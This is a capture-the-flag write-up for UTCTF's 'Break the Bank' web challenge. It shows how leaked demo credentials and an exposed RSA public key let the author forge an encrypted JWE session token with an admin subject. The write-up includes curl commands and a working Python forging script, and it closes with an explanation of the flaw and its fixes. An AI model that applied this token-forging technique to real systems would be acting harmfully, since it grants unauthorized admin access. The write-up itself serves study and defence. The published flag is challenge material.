# CTF Writeup — Break the Bank

**Event:** UTCTF  
**Category:** Web  
**Points:** 444  
**Solves:** 237  
**Challenge Author:** Emmett (@emdawg25)  
**Flag:** `utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}`

---

## Challenge Description

> "Let's just say that this bank isn't exactly following the latest trends in web design (or web security, for that matter). Just take a look at that website!"

The challenge gave me a URL to a fictional 1997-era banking website for **First National Savings Bank (FNSB)** at `challenge.utctf.live:5926`. The goal was to find and exploit a vulnerability to retrieve the flag.

---

## Step 1 — Reconnaissance

### 1.1 Examining the Website

The first thing I did was visit the challenge URL. It was a hilariously authentic 1990s banking portal — blinking text, marquee tags, a Windows 95-style login dialog, and a visitor counter. While it looked like a joke, I knew the vulnerability would be hiding somewhere in the details.

Digging through the HTML source, I noticed a link buried in the footer:

```html
<a href="/resources/FNSB_InternetBanking_Guide.pdf">
  Access our Internet Banking guide here.
</a>
```

### 1.2 Directory Listing Exposed at /resources

Visiting `/resources` directly in the browser revealed an **open directory listing** — a classic misconfiguration. Three files were exposed:

- `memo.txt` — an internal memorandum from the CEO
- `key.pem` — an RSA public key
- `FNSB_InternetBanking_Guide.pdf` — a customer-facing guide

### 1.3 Leaked Credentials in the PDF

Reading the PDF guide revealed demo credentials intended for prospective customers:

```
Username: testuser
Password: testpass123
```

### 1.4 The Internal Memo

The `memo.txt` was a gold mine. Written by bank president Harold J. Whitmore, it warned the development team:

> *"...the team should ensure that any development or convenience credentials that were introduced during the initial build and testing phases are reviewed and retired before the platform is considered production-ready."*

This was the key hint — the demo credentials from the PDF were **still active in production**.

---

## Step 2 — Initial Access

### 2.1 Logging In as testuser

The login endpoint expected a JSON body (not form data):

```bash
curl -s -c cookies.txt -X POST http://challenge.utctf.live:5926/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass123"}'
```

Login was successful and returned a token:

```json
{
  "token": "eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0...",
  "redirect": "/profile"
}
```

### 2.2 Inspecting the Token

I examined the `fnsb_token` cookie set after login. Decoding the header revealed this was not a standard JWT — it was a **JWE (JSON Web Encryption)** token:

```json
{"cty":"JWT","enc":"A256GCM","alg":"RSA-OAEP-256"}
```

> **JWE vs JWT:**
> - A regular JWT is **signed** — you can verify who created it.
> - A JWE is **encrypted** — the payload is hidden from the client.
> - JWE with RSA-OAEP means **anyone with the public key can encrypt**, but only the server (with the private key) can decrypt.

---

## Step 3 — Discovering the Vulnerability

### 3.1 Finding the Admin Endpoint

I tried accessing `/admin` while logged in as `testuser` and got a very telling error:

```json
{"error":"Forbidden: admin subject required"}
```

This was a critical clue. The server was decrypting the JWE token and checking the `sub` (subject) field inside. If I could forge a JWE token with `sub` set to `"admin"`, I could gain admin access.

### 3.2 The Core Vulnerability — Public Key Encryption Misuse

Here's the key insight that broke the challenge open:

**RSA-OAEP is an asymmetric encryption scheme:**

```
PUBLIC KEY  = encrypt data   (anyone can do this)
PRIVATE KEY = decrypt data   (only the server can do this)
```

The server had exposed its public key at `/resources/key.pem`. This meant I could encrypt **any payload I wanted** and the server would trustingly decrypt and use it as a valid session token.

**The fundamental flaw:** Encryption proves *confidentiality*, not *authenticity*. The server used encryption where it should have used signing. A signed token cannot be forged without the private key — but an encrypted-only token can be forged by **anyone with the public key**.

---

## Step 4 — Exploitation

### 4.1 Setup

```bash
curl -s http://challenge.utctf.live:5926/resources/key.pem -o key.pem
pip3 install joserfc --break-system-packages
```

### 4.2 Crafting the Forged JWE Token

I wrote a Python script to encrypt a malicious payload using the server's own public key:

```python
from joserfc import jwe
from joserfc.jwk import RSAKey
from joserfc.jwe import JWERegistry
import json

# Load the exposed public key
with open("key.pem", "rb") as f:
    key = RSAKey.import_key(f.read())

registry = JWERegistry(algorithms=["RSA-OAEP-256", "A256GCM"])

# Match the exact header structure of real tokens
protected = {"cty": "JWT", "alg": "RSA-OAEP-256", "enc": "A256GCM"}

# Forge an admin payload
payload = {"sub": "admin"}
plaintext = json.dumps(payload, separators=(',', ':')).encode()

token = jwe.encrypt_compact(protected, plaintext, key, registry=registry)
print(token)
```

### 4.3 Testing the Forged Token

```bash
TOKEN=$(python3 forge_jwe.py | tail -1)
curl -s -H "Cookie: fnsb_token=$TOKEN" http://challenge.utctf.live:5926/admin
```

The server decrypted the token, found `sub: admin` inside, and granted full admin access. The FNSB SysAdmin Console appeared with the flag displayed prominently:

```
utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}
```

---

## Vulnerability Explanation

### What Went Wrong

The application used JWE with RSA-OAEP-256 for session tokens. This is fundamentally broken for authentication for three reasons:

1. **Encryption ≠ Authentication.** Anyone with the public key can create a valid-looking encrypted token. The server cannot tell who created it.
2. **Public key was exposed.** The RSA public key was served at `/resources/key.pem`, giving attackers everything needed to forge tokens.
3. **No signature verification.** The server blindly trusted the decrypted payload without verifying it was created by a legitimate source.

### The Correct Approach

For authentication tokens, the server should use one of:

- **JWT with RS256** — server signs with private key. Anyone can verify with the public key, but *only the server* can create valid tokens.
- **JWT with HS256** — a shared HMAC secret that never leaves the server.
- **JWE + JWS (nested)** — encrypt AND sign, providing both confidentiality and authenticity.

---

## Full Attack Chain Summary

1. Found exposed `/resources` directory listing via a link in the HTML footer.
2. Read `memo.txt` — CEO memo hinted that test credentials were left active in production.
3. Read `FNSB_InternetBanking_Guide.pdf` — found demo credentials `testuser / testpass123`.
4. Logged in successfully — received a JWE token encrypted with RSA-OAEP-256.
5. Hit `/admin` — got error `"admin subject required"`, confirming token-based access control.
6. Downloaded `key.pem` — the server's RSA public key, also exposed in `/resources`.
7. Realized RSA-OAEP encryption is asymmetric — anyone with the public key can encrypt.
8. Forged a JWE token containing `{"sub":"admin"}` encrypted with the server's public key.
9. Sent forged token to `/admin` — server decrypted it, trusted the payload, granted admin access.
10. Retrieved the flag from the admin console.

---

*Writeup by Prasanna | UTCTF | Break the Bank (444 pts)*
